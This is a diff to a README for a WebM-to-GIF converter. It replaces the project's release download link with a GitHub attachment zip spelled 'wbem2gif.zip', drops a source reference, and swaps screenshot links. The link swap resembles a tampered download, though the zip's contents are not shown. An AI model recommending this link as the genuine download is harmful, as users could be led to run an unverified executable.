@@ -2,17 +2,17 @@
 
 
 # webm2gif
-Refer to https://gist.github.com/Potherca/18423260e2c9a4324c9ecb0c0a284066
 
 ## Download Link
-https://github.com/lilinth/webm2gif/releases/download/release/webm2gif.zip
+https://github.com/user-attachments/files/20863507/wbem2gif.zip
 
 ## Usage
 Usage:
 ```
 Run webm2gif.exe directly and select your folder then click on start. Just enjoy it.
 ```
-![Example Image](ui1.PNG)
-![Example Image](ui2.PNG)
+![image](https://github.com/user-attachments/assets/54b87cdc-26ad-448f-92b4-a0bc2eee4a87)
+![image](https://github.com/user-attachments/assets/858227f9-cf1c-48e1-ad32-580defaba716)
+
 
 [![Lilinth's GitHub stats](https://github-readme-stats.vercel.app/api?username=lilinth)](https://github.com/anuraghazra/github-readme-stats)
